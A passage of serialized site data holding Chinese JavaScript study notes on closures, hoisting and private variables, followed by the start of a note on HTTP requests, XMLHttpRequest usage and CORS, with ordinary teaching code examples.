(10)，返回给了非定义时的环境，这里是返回给了全局环境\n}                           // (11)\nvar baz = foo();            // (12)\nbaz();                      // (13)\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n\n\n这个例子中，bar与bar所处的环境一起构成了一个 闭包 结构，在(10)将bar函数作为值返回给了外部（非定义时的环境）。其实foo已经执行完了，foo内的作用域链也已经销毁了，但是foo内的变量对象还没有销毁，因为是bar的闭包阻挡了它销毁，bar的闭包涵盖了foo函数的环境以及全局环境里 所有的变量对象 以及它们的指针也就是 作用域链。然后在(13)调用bar函数，bar就可以通过闭包访问a b c三个变量。即使不在非定义时的环境里调用，都能通过闭包来访问被闭包涵盖到的变量。\n\n\n# 3.1 闭包与变量\n\n函数只能从它闭包中访问到变量的最后有效值\n\nfunction createFunction() {\n    var result = new Array();\n    for (var i = 0; i < 10; i ++) {\n        result[i] = function() {\n            return i;\n        }\n    }\n    return result;\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n\n返回的result是个函数数组，数组里的每个函数都有自己的闭包，它们的闭包里都有指向i的指针，并且由于i使用var这种没有块级作用域的定义关键词来定义的，导致i是在createFunction里是同一个变量，那么所有的闭包都共享它，最后createFunction执行完，i是10，那么函数数组中每个函数最后通过闭包访问的i都是10。\n\nfunction createFunction() {\n    var result = new Array();\n    for (var i = 0; i < 10; i ++) {\n        result[i] = function(num) {\n            return function() {\n                return num;\n            }\n        }(i);\n    }\n    return result;\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n\n\n上面例子使用了一个匿名函数存储每一次for循环的i值，函数数组里每一个函数的闭包优先访问外层匿名函数的num也就是每次循环的i值。其实在es6中引入let后直接将原先的例子中的var i改为let i，这个效果跟这个匿名函数包裹的效果一样。\n\n\n# 3.2 闭包与this对象\n\n函数作为一个值被return到定义时环境之外，这个函数不属于谁，它的this一般会绑定到window对象（非严格模式），那么在闭包中使用this的话就会得到window对象。如果想访问外层函数里的this，可以将外层函数里的this使用 其他变量保存。arguments跟this一样，也需要特殊处理。\n\nvar name = "The Window";\nvar obj = {\n    name: "My Object",\n    getNameFunc: function() {\n        var that = this;\n        return function() {\n            return that.name;   // 如果不使用that，此时这个匿名函数内的this就是指向window对象的\n        }\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n\n\n# 3.3 内存泄漏\n\n闭包涵盖了 嵌套外层函数的环境 和 全局环境 里所有的 变量对象 以及它们的指针也就是 作用域链。如果函数被作为值被return到定义时环境之外，使用完后需要尽快将函数的引用置为null，否则会让闭包里的对象一直占用着内存。当然，如果直接将闭包里的对象置为null也可以减少内存的占用。\n\n\n# 四、模仿块级作用域\n\njs没有块级作用域（es6有了），但可以通过匿名函数来模仿块级作用域。\n\n将行数声明包含在一对圆括号中表示它是一个函数表达式，再在其后添加另一对圆括号会立即调用这个函数。\n\nfunction outputNumbers(count) {\n    (function () {\n        for (var i = 0; i < count; i ++) {\n            console.log(i);\n        }\n    })();\n    console.log(i); // 导致一个错误，i定义在一个匿名函数内部，在函数外部就访问不了\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\n\n# 五、私有变量\n\n对象属性都是公有的，因为用this.xxx给实例绑定的，而函数内部可定义私有变量，不使用this，直接在内部定义一个变量，外部就访问不到了。\n\n可以在函数内部创建一个闭包，那么闭包可以访问那些是有变量，并且这个闭包还可以用this设置为公有方法供外部使用，这种有权访问私有变量和私有函数的公有方法称为特权方法。\n\nfunction MyObject() {\n    var privateVariable = 10;           // 私有变量\n    function privateFunction() {        // 私有方法\n        return false;\n    }\n    this.publicMethod = function() {    // 特权方法\n        privateVariable ++;\n        return privateVariable;\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n',normalizedContent:'# 函数表达式\n\n\n# 一、函数的特征\n\n在3.引用类型#function类型里介绍过定义函数的三种方式：函数声明、函数表达式、构造函数。\n\n其中 函数声明 有个重要的特征就是 函数声明提升，意思是在执行代码之前会 先读取函数声明。这就意味着可以把函数声明放在调用它的语句的 后面。\n\nfoo();                  // 输出数值3，因为(1)和(3)会“函数声明提升”，并且最后(3)会覆盖(1)\nfunction foo() {        // (1) 函数声明提升\n    console.log(1);\n}\nvar foo = function() {  // (2) 变量声明提升，但是函数声明提升会优先。并且还是同名，那就不会进行变量声明提升了\n    console.log(2);\n};\nfunction foo() {        // (3) 函数声明提升\n    console.log(3);\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n\n函数表达式 ，看起来像是常规的变量赋值语句，即创建一个函数并将它赋值给变量。这种情况下创建的函数叫 匿名函数（拉姆达函数），因为function关键字后面没有标识符。理解 函数声明提升 就要要区分函数声明和函数表达式之间的区别，例：\n\nsayhi(); // 错误：函数还不存在\nvar sayhi = function() {\n    console.log("hi!");\n}\n\n/*********也不要这样做****************/\nif (condition) {\n    function sayhi() {\n        console.log("hi!");\n    }\n} else {\n    function sayhi() {\n        console.log("yo!");\n    }\n}\n/*********可以这样做******************/\nvar sayhi;\nif (condition) {\n    sayhi = function() {\n        console.log("hi!");\n    }\n} else {\n    sayhi = function() {\n        console.log("yo!");\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n\n\n在3.引用类型#作为值的函数里提过函数 作为值来使用，比如作为函数的返回值：\n\nfunction comparisonfunction(propertyname) {\n    return function (object1, object2) {    // 作为了comparisonfunction的返回值来使用\n        var v1 = object1[propertyname];\n        var v2 = object2[propertyname];\n        if (v1 < v2) {\n            return -1;\n        } else if (v1 > v2) {\n            return 1;\n        } else {\n            return 0;\n        }\n    };\n}\nvar values = [ { age: 3 }, { age: 10 }, { age: 15 }, { age: 1 }, { age: 5 } ];\nvalues.sort(comparisonfunction("age"));\nconsole.log(values); // [ { age: 1 }, { age: 3 }, { age: 5 }, { age: 10 }, { age: 15 } ]\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n\n\n\n# 二、递归\n\n一个函数通过名字调用自身，这样的结构是 递归函数。\n\n// 经典的递归阶乘函数\nfunction factorial(num) {\n    if (num <= 1) {\n        return 1;\n    } else {\n        return num * factorial(num - 1);\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\n这个函数表面看起来没什么问题，但下面的代码可能导致它出错：\n\nvar anotherfactorial = factorial;\nfactorial = null;                   // anotherfactorial还指引着原函数，而factorial引进断开了\nconsole.log(anotherfactorial(4));   // 出错，到factorial(num - 1);时发现factorial已经不存在了\n\n\n1\n2\n3\n\n\narguments.callee是一个指向正在执行的函数的指针，可以使用来它来解决这个问题：\n\nfunction factorial(num) {\n    if (num <= 1) {\n        return 1;\n    } else {\n        return num * arguments.callee(num - 1);\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\n严格模式下不能使用arguments.callee，可以使用命名函数表达式来达成相同的结果：\n\nvar factorial = (function f(num) {\n    if (num <= 1) {\n        return 1;\n    } else {\n        return num * f(num - 1);\n    }\n});\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\n\n# 三、闭包\n\n在“变量、作用域和内存问题”里介绍过执行环境及作用域，可以简单回顾一下函数的创建以及调用。\n\n * 在某个环境（全局或某个函数内部）中执行时，假如遇到了“创建函数”的语句。创建 这个新函数时，会复制环境里的 作用域链 并保存到新函数的[[scope]]属性中。\n * 当这个函数被 调用 时，会初始化内部的环境（变量对象、作用域链、this）。用 this 绑定函数调用处的上下文对象；初始化函数内部的变量保存到 变量对象 中；复制函数的[[scope]]属性作为函数内部的 作用域链，并将变量对象相关的指针也保存在这个作用域链上。\n\n其实 闭包 这个结构存在于上面的过程中了，创建函数时 函数本身和它所处的环境 构成了一个闭包结构，这个闭包涵盖了 嵌套外层函数的环境 和 全局环境 里所有的 变量对象 以及它们的指针也就是 作用域链。\n\nvar a = 1;                  // (1)\nfunction foo() {            // (2)\n    var b = 2;              // (3)\n    function bar() {        // (4)\n        console.log(a);     // (5)，可以访问全局变量a，输出1\n        console.log(b);     // (6)，可以访问嵌套外层变量b，输出2\n        console.log(c);     // (7)，可以访问嵌套外层变量c，输出3\n    }                       // (8)\n    var c = 3;              // (9)\n    bar();                  // (10)\n}                           // (11)\nfoo();                      // (12)\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n\n\n分析一下上面这个例子，bar函数在创建时，bar与bar所处的环境（foo的内部环境和foo外部的全局环境）一起构成了一个 闭包 结构。在(10)调用bar函数，在(5)(6)(7)里可以访问a b c三个变量。但严格地说，这三个变量不是通过闭包访问的，其实是单纯地通过 作用域链 访问的，这个作用域链其实也是闭包的一部分。这样不好观察闭包，下面这个例子可以很清晰地观察闭包。\n\nvar a = 1;                  // (1)\nfunction foo() {            // (2)\n    var b = 2;              // (3)\n    function bar() {        // (4)\n        console.log(a);     // (5)，可以访问全局变量a，输出1\n        console.log(b);     // (6)，可以访问嵌套外层变量b，输出2\n        console.log(c);     // (7)，可以访问嵌套外层变量b，输出2\n    }                       // (8)\n    var c = 3;              // (9)\n    return bar;             // (10)，返回给了非定义时的环境，这里是返回给了全局环境\n}                           // (11)\nvar baz = foo();            // (12)\nbaz();                      // (13)\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n\n\n这个例子中，bar与bar所处的环境一起构成了一个 闭包 结构，在(10)将bar函数作为值返回给了外部（非定义时的环境）。其实foo已经执行完了，foo内的作用域链也已经销毁了，但是foo内的变量对象还没有销毁，因为是bar的闭包阻挡了它销毁，bar的闭包涵盖了foo函数的环境以及全局环境里 所有的变量对象 以及它们的指针也就是 作用域链。然后在(13)调用bar函数，bar就可以通过闭包访问a b c三个变量。即使不在非定义时的环境里调用，都能通过闭包来访问被闭包涵盖到的变量。\n\n\n# 3.1 闭包与变量\n\n函数只能从它闭包中访问到变量的最后有效值\n\nfunction createfunction() {\n    var result = new array();\n    for (var i = 0; i < 10; i ++) {\n        result[i] = function() {\n            return i;\n        }\n    }\n    return result;\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n\n返回的result是个函数数组，数组里的每个函数都有自己的闭包，它们的闭包里都有指向i的指针，并且由于i使用var这种没有块级作用域的定义关键词来定义的，导致i是在createfunction里是同一个变量，那么所有的闭包都共享它，最后createfunction执行完，i是10，那么函数数组中每个函数最后通过闭包访问的i都是10。\n\nfunction createfunction() {\n    var result = new array();\n    for (var i = 0; i < 10; i ++) {\n        result[i] = function(num) {\n            return function() {\n                return num;\n            }\n        }(i);\n    }\n    return result;\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n\n\n上面例子使用了一个匿名函数存储每一次for循环的i值，函数数组里每一个函数的闭包优先访问外层匿名函数的num也就是每次循环的i值。其实在es6中引入let后直接将原先的例子中的var i改为let i，这个效果跟这个匿名函数包裹的效果一样。\n\n\n# 3.2 闭包与this对象\n\n函数作为一个值被return到定义时环境之外，这个函数不属于谁，它的this一般会绑定到window对象（非严格模式），那么在闭包中使用this的话就会得到window对象。如果想访问外层函数里的this，可以将外层函数里的this使用 其他变量保存。arguments跟this一样，也需要特殊处理。\n\nvar name = "the window";\nvar obj = {\n    name: "my object",\n    getnamefunc: function() {\n        var that = this;\n        return function() {\n            return that.name;   // 如果不使用that，此时这个匿名函数内的this就是指向window对象的\n        }\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n\n\n# 3.3 内存泄漏\n\n闭包涵盖了 嵌套外层函数的环境 和 全局环境 里所有的 变量对象 以及它们的指针也就是 作用域链。如果函数被作为值被return到定义时环境之外，使用完后需要尽快将函数的引用置为null，否则会让闭包里的对象一直占用着内存。当然，如果直接将闭包里的对象置为null也可以减少内存的占用。\n\n\n# 四、模仿块级作用域\n\njs没有块级作用域（es6有了），但可以通过匿名函数来模仿块级作用域。\n\n将行数声明包含在一对圆括号中表示它是一个函数表达式，再在其后添加另一对圆括号会立即调用这个函数。\n\nfunction outputnumbers(count) {\n    (function () {\n        for (var i = 0; i < count; i ++) {\n            console.log(i);\n        }\n    })();\n    console.log(i); // 导致一个错误，i定义在一个匿名函数内部，在函数外部就访问不了\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\n\n# 五、私有变量\n\n对象属性都是公有的，因为用this.xxx给实例绑定的，而函数内部可定义私有变量，不使用this，直接在内部定义一个变量，外部就访问不到了。\n\n可以在函数内部创建一个闭包，那么闭包可以访问那些是有变量，并且这个闭包还可以用this设置为公有方法供外部使用，这种有权访问私有变量和私有函数的公有方法称为特权方法。\n\nfunction myobject() {\n    var privatevariable = 10;           // 私有变量\n    function privatefunction() {        // 私有方法\n        return false;\n    }\n    this.publicmethod = function() {    // 特权方法\n        privatevariable ++;\n        return privatevariable;\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n',charsets:{cjk:!0}},{title:"6.Http、Ajax和跨域",frontmatter:{title:"6.Http、Ajax和跨域"},regularPath:"/book-web/html%E3%80%81css%E3%80%81js%E3%80%81ts/%E5%AD%A6%E4%B9%A0JavaScript/6.Http%E3%80%81Ajax%E5%92%8C%E8%B7%A8%E5%9F%9F.html",relativePath:"book-web/html、css、js、ts/学习JavaScript/6.Http、Ajax和跨域.md",key:"v-71c07318",path:"/book-web/html%E3%80%81css%E3%80%81js%E3%80%81ts/%E5%AD%A6%E4%B9%A0JavaScript/6.Http%E3%80%81Ajax%E5%92%8C%E8%B7%A8%E5%9F%9F.html",headers:[{level:2,title:"一、Http请求概述",slug:"一、http请求概述",normalizedTitle:"一、http请求概述",charIndex:19},{level:3,title:"1.1 输入一个URL回车",slug:"_1-1-输入一个url回车",normalizedTitle:"1.1 输入一个url回车",charIndex:34},{level:3,title:"1.2 简单说明",slug:"_1-2-简单说明",normalizedTitle:"1.2 简单说明",charIndex:176},{level:2,title:"二、XMLHttpRequest对象",slug:"二、xmlhttprequest对象",normalizedTitle:"二、xmlhttprequest对象",charIndex:996},{level:3,title:"2.1 XHR的使用",slug:"_2-1-xhr的使用",normalizedTitle:"2.1 xhr的使用",charIndex:1019},{level:3,title:"2.2 进度事件",slug:"_2-2-进度事件",normalizedTitle:"2.2 进度事件",charIndex:4113},{level:3,title:"2.3 头部信息和POST请求",slug:"_2-3-头部信息和post请求",normalizedTitle:"2.3 头部信息和post请求",charIndex:5671},{level:3,title:"2.4 上传",slug:"_2-4-上传",normalizedTitle:"2.4 上传",charIndex:7722},{level:2,title:"三、跨域资源共享",slug:"三、跨域资源共享",normalizedTitle:"三、跨域资源共享",charIndex:9017},{level:3,title:"3.1 CORS",slug:"_3-1-cors",normalizedTitle:"3.1 cors",charIndex:9030},{level:3,title:"3.2 简单请求",slug:"_3-2-简单请求",normalizedTitle:"3.2 简单请求",charIndex:9314},{level:3,title:"3.3 非简单请求",slug:"_3-3-非简单请求",normalizedTitle:"3.3 非简单请求",charIndex:11246},{level:3,title:"3.4 带凭据的请求",slug:"_3-4-带凭据的请求",normalizedTitle:"3.4 带凭据的请求",charIndex:14991},{level:2,title:"四、其他跨域技术",slug:"四、其他跨域技术",normalizedTitle:"四、其他跨域技术",charIndex:15807},{level:3,title:"4.1 图像Ping",slug:"_4-1-图像ping",normalizedTitle:"4.1 图像ping",charIndex:15820},{level:3,title:"4.2 JSONP",slug:"_4-2-jsonp",normalizedTitle:"4.2 jsonp",charIndex:16252},{level:3,title:"4.3 Comet",slug:"_4-3-comet",normalizedTitle:"4.3 comet",charIndex:16951},{level:3,title:"4.4 服务器发送事件",slug:"_4-4-服务器发送事件",normalizedTitle:"4.4 服务器发送事件",charIndex:18214},{level:3,title:"4.5 Web Socket",slug:"_4-5-web-socket",normalizedTitle:"4.5 web socket",charIndex:19620}],lastUpdated:"7/6/2022, 3:41:21 PM",lastUpdatedTimestamp:1657093281e3,headersStr:"一、Http请求概述 1.1 输入一个URL回车 1.2 简单说明 二、XMLHttpRequest对象 2.1 XHR的使用 2.2 进度事件 2.3 头部信息和POST请求 2.4 上传 三、跨域资源共享 3.1 CORS 3.2 简单请求 3.3 非简单请求 3.4 带凭据的请求 四、其他跨域技术 4.1 图像Ping 4.2 JSONP 4.3 Comet 4.4 服务器发送事件 4.5 Web Socket",content:"# Http、Ajax和跨域\n\n\n# 一、Http请求概述\n\n\n# 1.1 输入一个URL回车\n\n在浏览器地址栏里输入一个URL然后按下回车，会发生以下事情：\n\n * DNS解析，建立TCP连接（三次握手），发送Http请求。\n * server接收Http请求，处理并返回。\n * 客户端接收到返回数据后，处理数据（如渲染页面，执行js）。\n\n\n# 1.2 简单说明\n\n打开浏览器，按下F12会打开浏览器控制台，查看控制台的Network页签。然后在浏览器地址栏里输入www.baidu.com并回车。\n\n 1. DNS解析：DNS（域名系统）拿到https://www.baidu.com，将它解析成一个IP地址，例如180.101.49.11:443。这个IP地址就是百度某个服务器的IP地址。443是https的默认端口，80是http默认端口。DNS解析是DNS客户端向DNS服务器端发送一份查询报文也就是域名等，DNS服务器端会返回一份报文也就是IP地址等。\n    \n    \n\n 2. 建立TCP连接：也就是三次握手。第一次握手，客户端询问服务端“你是否可用”；第二次握手，服务端告知客服端“我可用”；第三次握手，客户端告知服务端“我即将访问你”。\n\n 3. 发送Http请求：大多发送的是GET或者POST请求，可以是URL直链请求也可以使用ajax异步发送请求。\n\n 4. server处理请求：确认访问权限，处理好业务逻辑之后会返回响应。\n    \n    // node.js处理请求\n    const http = require('http');\n    const server = http.createServer((req, res) => {\n        console.log('req.method', req.method);\n        console.log('req.url', req.url);\n        res.end('hello');\n    });\n    server.listen(8000);\n    \n    \n    1\n    2\n    3\n    4\n    5\n    6\n    7\n    8\n    \n\n 5. 接收响应：客户端处理响应，比如加载返回的js、css文件并执行它们。\n\n\n# 二、XMLHttpRequest对象\n\n\n# 2.1 XHR的使用\n\nAjax是Asynchronous JavaScript And XML的缩写，表示异步的JavaScript+XML。Ajax是一门浏览器与服务器的通信技术，它的特点是无需刷新页面即可从服务器取得数据（请求然后响应最后修改DOM，无需刷新页面），它的核心是XMLHttpRequest对象（简称XHR），前端人员可以使用这个对象进行服务器数据请求。需要注意的是，它名称虽然包含XML，但其实与数据格式无关（可能是纯文本、XML、JSON）。\n\n// 先实例化它，原生XMLHttpRequest，没有参数\nvar xhr = new XMLHttpRequest();\n\n\n1\n2\n\n\n实例化XMLHttpRequest之后，我们就可以准备发送一个请求了，先配置请求信息（仅配置），再发送请求（建立连接）。\n\n * 使用xhr.open()进行配置。该方法接收三个参数，第一个参数是什么类型的请求，比如是\"GET\"还是\"POST\"（最好都大写）；第二个参数是请求地址，比如http://localhost/test.txt；第三个参数是是否异步发送请求，一般是true（可以不传，默认值就是true）。\n * 发送请求使用xhr.send(param)，GET请求是没有param的，POST是有param的，param是请求主体发送的数据（request body）。\n\n// 配置请求信息\nxhr.open(\"GET\", \"http://localhost/test.txt\", true);\n// 发送请求。GET是没有param，POST是有param的，param是request body\nxhr.send(param)\n\n\n1\n2\n3\n4\n\n\n发送请求过后，因为一般是异步的，所以我们要知道请求/响应到了什么阶段，xhr的readyState属性就记录这些信息：\n\n * 0：未初识化。尚未调用open()方法。常定义UNSENT = 0; // 初始状态。\n * 1：启动。已经调用open()方法，但尚未调用send()方法。常定义OPENED = 1; // open被调用。\n * 2：发送。已经调用send()方法，但尚未接收到响应。常定义HEADERS_RECEIVED = 2; // 接收到response header。\n * 3：接收。已经接收到部分响应数据。常定义LOADING = 3; // 响应正在被加载。\n * 4：完成。已经接收到全部响应数据。常定义DONE = 4; // 请求完成。\n\n并且readyState的值每次变化时都会触发readystatechange事件。那前端人员就可以监听这个事件，再配合readyState的为4，就可以判断何时去处理响应。\n\nxhr.onreadystatechange = function() {\n    // 已经接收到全部响应数据\n    if (xhr.readyState == 4) {\n        // 处理响应\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n\n\n浏览器收到服务器的响应后，会填充XHR对象的属性。相关属性如下：\n\n * responseText（新脚本是response）：作为响应主体被返回的文本（不管什么数据类型）。\n * responseXML（这是旧脚本）：如果响应的内容类型是text/xml或application/xml，这个属性中将保存包含着响应数据的XML DOM文档。\n * status：响应额HTTP状态。\n * statusText：HTTP状态的说明，作为参考，一般不作为后续js判断。\n\n前端人员需要在响应返回后，拿到这个XHR对象做校验和业务逻辑处理（处理响应）。校验就是判断状态码也就是status属性，是[200, 300)以及304都是这次请求成功的标志。\n\n// `[200, 300)`以及`304`是请求成功\nif ((xhr.status >= 200 && xhr.status <300 ) || xhr.status == 304) {\n    alert(xhr.responseText);\n} else {\n    alert('Request was unsuccessful: ' + xhr.status);\n}\n\n\n1\n2\n3\n4\n5\n6\n\n\n如果在接收响应前想取消异步请求（终止请求），可以使用xhr.abort()方法，来停止XHR对象的事件触发，并且不能访问到与响应有关的属性。\n\n因为技术的进步，responseText和responseXML都比较老旧了，它们常被response替代，并且还常使用xhr.responseType来设置响应格式：\n\n * \"\"：同\"text\"。\n * \"text\"：response是DOMString对象中的文本。\n * \"arraybuffer\"：response是一个包含二进制数据的ArrayBuffer。\n * \"blob\"：response是一个包含二进制数据的Blob对象。\n * \"document\"：response 是一个 HTML Document 或 XML XMLDocument，根据接收到的数据的MIME类型而定。\n * \"json\"：response是通过将接收到的数据内容解析为JSON，从而创建js对象。\n\n这一节最后，我们写一个比较完整的例子：\n\n// 配置请求信息\nvar xhr = new XMLHttpRequest();\n// 配置请求信息\nxhr.open(\"GET\", \"/blog/xmlhttprequest/json\", true);\n// 设置响应格式，我们用常用的json格式\nxhr.responseType = 'json';\n// 发送请求。GET是没有param\nxhr.send()\n// 监听readystate的变化，readystate为4去处理响应\nxhr.onreadystatechange = function() {\n    // readystate为4，表示已经接收到全部响应数据，可以开始处理响应信息了\n    if (xhr.readystate == 4) {\n        // 响应状态码status为[200, 300)以及304是请求成功\n        if ((xhr.status >= 200 && xhr.status <300 ) || xhr.status == 304) {\n            // 写法一，这是旧脚本的写法\n            console.log('xhr.responseText', xhr.responseText);\n            // 写法二，这是新脚本的写法，返回的是json并且还转为了js对象\n            console.log('xhr.response', xhr.response);\n        } else {\n            console.log(('Request was unsuccessful: ' + xhr.status);\n        }\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n\n\n\n# 2.2 进度事件\n\n进度事件（Progress Events）定义了与客户端服务器通信有关的事件：\n\n * progress：在接收响应期间持续不断地触发。例如下载进度。\n * error：在请求发生错误时触发。例如网络中断或者无效的URL。\n * load：在接收到完整的响应数据时触发。即使xhr.status为400或500等。\n * abort：在因为调用abort()方法而终止连接时触发。\n * loadstart：在接收到响应数据的第一个字节时触发。\n * loadend：在通信完成或触发error、abort或load事件后触发。\n * timeout：请求超时。可以在请求发送前设置xhr.timeout=30000。\n\n前三个用的比较多，也经常使用load事件来替代readystatechange事件，当然内部还是继续搭配xhr.status状态码判断返回结果。\n\nprogress常用作进度指示器，监听的回调函数有个event参数，他有三个参数，lengthComputable、position和totalSize，分别表示“进度信息是否可用”、“已接收的字节数”和“根据Content-Length响应头部确定的预期字节数”。后两个参数在现如今的js中应该是loaded和total了（意思还是一样的），position和totalSize可能或许还会存在。\n\nvar xhr = new XMLHttpRequest();\n// 下载一个文件\nxhr.open('GET', '/blog/xmlhttprequest/load', true);\nxhr.send();\n// 请求收到了完整的响应\nxhr.onload = function(){\n    if ((xhr.status >= 200 && xhr.status < 300) || xhr.status == 304) {\n        // 写法一，这是旧脚本的写法\n        console.log('xhr.responseText', xhr.responseText);\n        // 写法二，这是新脚本的写法\n        console.log('xhr.response', xhr.response);\n    } else {\n        console.log('xhr.status', xhr.status);\n        console.log('xhr.statusText', xhr.statusText);\n    }\n}\n// 接收响应期间一直不断的触发该事件\nxhr.onprogress = function(event) {\n    if (event.lengthComputable) {\n        // 写法一，这是旧脚本的写法\n        console.log(`Received ${event.position} of ${event.totalSize} bytes`);\n        // 写法二，这是新脚本的写法\n        console.log(`Received ${event.loaded} of ${event.total} bytes`);\n    }\n}\n// 请求失败，断网或者URL错误\nxhr.onerror = function() {\n    console.log('Request failed');\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n\n\n\n# 2.3 头部信息和POST请求\n\n每个HTTP请求和响应都会带有一个头部信息（请求头部和响应头部），我们来了解一下默认的浏览器头部信息：\n\n * Accept：浏览器能够处理的内容类型。\n * Accept-Charset：浏览器能够显示的字符集。\n * Accept-Encoding：浏览器能够处理的压缩编码。\n * Accept-Language：浏览器当前设置的语言。\n * Connection：留恋其与服务器之连接的类型。\n * Cookie：当前页面设置的任何Cookie。\n * Host：发出请求的页面所在域。\n * Refere：发出请求的页面的URI。（HTTP规范拼错了单词，本来应该是referre，以规范为主）\n * User-Agent：浏览器的用户代理字符串。\n\n我们不建议修改默认的浏览器头部信息，但可以使用自定义的头部信息，xhr.setRequestHeader(xxx, yyyy)，xxx是字段名，yyy是值。要注意的是setRequestHeader()方法必须得在open()和send()之间使用。\n\nxhr.open(\"GET\", \"http://localhost/test.txt\", true);\nxhr.setRequestHeader('MyHeader', 'MyValue');\nxhr.send(null);\n\n\n1\n2\n3\n\n\n我们可以获取响应头部信息，使用xhr.getResponseHeader(xxx)获取单个，xhr.getAllResponseHeader()获取全部响应头部信息。\n\nGET请求，是将简单传参数据放到了URL的末尾，但必须经过encodeURIComponent()进行编码之后才能放到URL的末尾，所有的键值对儿都必须由&进行分隔。\n\nxhr.open('GET', 'example.php?name1=value1&name2=value2&name3=value3'， true);\n// 向现有URL的末尾添加查询字符串参数\nfunction addURLParam(url, name, value)() {\n    // 含有?那就追加&，还不含有?那就加追?\n    url += (url.indexOf('?') == -1 ? '?' : '&');\n    // 添加?或&就可以添加键值对儿了\n    url += encodeURIComponent(name) + '=' encodeURIComponent(value);\n    return url;\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n\nPOST请求，是将较为复杂数据作为了请求的主体提交的，这些数据大概率会被服务器保存，属于重要数据。这些数据是放在send()的入参里，数据格式通常是multipart/form-data、JSON、XML。\n\n特别注意，很久以前的表单数据传递要设置xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded')。而在后来，定义了一个新类型FormData，简化了表单数据序列化，也不用再手动设置Content-Type头部信息。\n\nFormData方式（其实就是multipart/form-data）：\n\n// FormData序列化表单，创建与表单格式相同的数据\nvar data = new FormData(document.forms[0]);\n// 追加新的键值对\ndata.append(\"name\", \"JavaScript\");\nvar xhr = new XMLHttpRequest();\nxhr.open(\"POST\", \"example.php\", true);\n// 使用FormData后无需设置Content-Type头部信息\n// xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');\n// 发送请求\nxhr.send(data);\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n\nJSON形式：\n\nvar xhr = new XMLHttpRequest();\n// 转为json字符串\nvar json = JSON.stringify({ name: \"Bob\", age: 8});\nxhr.open(\"POST\", 'example.php', true)\n// 这里不要忘了，这不同于FormData，这个得手动设置\nxhr.setRequestHeader('Content-type', 'application/json; charset=utf-8');\nxhr.send(json);\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\n\n# 2.4 上传\n\n上传请求比较特殊，它的上传进度不是xhr.onprogress而是xhr.upload.onprogress，并且其他常用的事件都是在xhr.upload上。\n\n<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n    <meta charset=\"UTF-8\">\n    <title>Document</title>\n</head>\n<body>\n    \x3c!-- 文件上传 --\x3e\n    <input type=\"file\" onchange=\"upload(this.files[0])\">\n    <script type=\"text/javascript\">\n        function upload(file) {\n            var xhr = new XMLHttpRequest();\n            // 上传进度\n            xhr.upload.onprogress = function(event) {\n                console.log(`Uploaded ${event.loaded} of ${event.total}`);\n            };\n            // 请求收到了完整的响应\n            xhr.onload = function(){\n                if ((xhr.status >= 200 && xhr.status < 300) || xhr.status == 304) {\n                    console.log('xhr.response', xhr.response);\n                } else {\n                    console.log('xhr.status', xhr.status);\n                    console.log('xhr.statusText', xhr.statusText);\n                }\n            }\n            // 请求失败\n            xhr.onerror = function() {\n                console.log('Request failed');\n            }\n            xhr.open(\"POST\", \"/blog/xmlhttprequest/upload\");\n            xhr.send(file);\n        }\n    <\/script>\n</body>\n</html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n\n\n\n# 三、跨域资源共享\n\n\n# 3.1 CORS\n\n使用Ajax技术有个限制，那就是不能跨域进行请求（跨域也叫跨源），它只能访问相同域名、相同端口、相同协议的资源（同源）。\n\nCORS（Cross-Origin Resource Sharing）是由W3C推出的一个基于HTTP头部的跨域资源共享技术。CORS新增了一组的HTTP头部字段，存储着预检请求信息或源信息；CORS也让服务器声明了哪些源站有权访问哪些资源（判断标准），接收请求时服务器会拿到源信息，并以这个标准作为判断依据；另外，对于非简单请求会先进行预检，拿到预检请求信息判断是否安全标准，在通过预检后才能进行实际的跨域请求。\n\n\n# 3.2 简单请求\n\n大多浏览器是通过XMLHttpRequest对象实现了对CORS的原生支持。如果要检测浏览器的XHR是否支持CORS，可以检测XHR对象上是否具有withCredentials属性（不支持IE10以及以前版本）。\n\n简单请求：请求方法要较为简单，自定义的头部信息较为安全和标准。也就是大部分情况满足下面条件即可（少部分去MDN查）：\n\n * 使用较为简单的请求方法，GET或HEAD或POST。\n * 